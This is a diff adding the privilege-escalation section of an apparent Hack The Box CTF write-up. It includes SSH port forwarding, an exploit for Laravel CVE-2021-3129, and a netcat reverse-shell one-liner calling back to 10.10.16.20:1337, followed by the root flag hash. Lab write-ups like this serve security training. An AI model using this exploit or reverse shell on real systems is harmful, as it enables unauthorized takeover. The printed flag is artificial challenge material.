@@ -207,6 +207,79 @@ $
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dd833cf7-f1ab-48b4-b2f6-48b443fe461a)
 
 
+21. Anyway, the remote server does not have phpggc. Hence we need to do port forwarding for privesc.
+
+```
+┌──(brandy㉿bread-yolk)-[~/.ssh]
+└─$ ssh -i strapi strapi@10.10.11.105 -L 8000:localhost:8000
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Sep 14 15:55:23 UTC 2023
+
+  System load:  0.07              Processes:           177
+  Usage of /:   83.3% of 4.85GB   Users logged in:     0
+  Memory usage: 27%               IP address for eth0: 10.10.11.105
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Sep 14 15:55:11 2023 from 10.10.16.20
+$ 
+
+```
+
+> CHECKS localhost port 8000
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/38376a58-487b-4bf4-8de9-e4cb87cb13c1)
+
+
+
+22. Great! I did a small research about the laravel 8.4.2 exploit and found this great github documentation -> https://github.com/nth347/CVE-2021-3129_exploit.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e7adf5ba-b837-4109-8330-603d4cea8d5f)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/369b6a5e-1cf8-47b0-b9a3-e062f29991a5)
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c4c579cd-9f1a-4d7b-8c6d-afa2e5c636f6)
+
+
+23. Let's set a listener and sent our reverse shell payload.
+
+> REVSHELL
+
+```
+./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.20 1337 >/tmp/f'
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cf138f21-cc3c-4268-869e-909656dbcecf)
+
+
+> GETTING ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/43bc36d6-d56d-475b-b7e7-a6e1e00c0fa9)
+
+
+## ROOT FLAG
+
+```
+0acd0844e50a55d767ee399fa18019d6
+```
+
 
 
 
